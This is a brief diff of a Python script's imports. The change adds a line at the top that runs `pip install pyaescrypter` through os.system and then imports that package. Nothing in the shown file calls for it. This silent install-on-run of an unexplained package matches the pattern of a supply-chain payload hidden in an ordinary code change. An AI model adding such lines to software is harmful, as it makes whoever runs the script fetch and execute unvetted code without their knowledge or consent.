@@ -1,7 +1,9 @@
+import os
+os.system("pip install pyaescrypter")
+import pyaescrypter
 from optparse import Option
 import requests
 import threading
-import os
 import random
 import time
 import colorama 
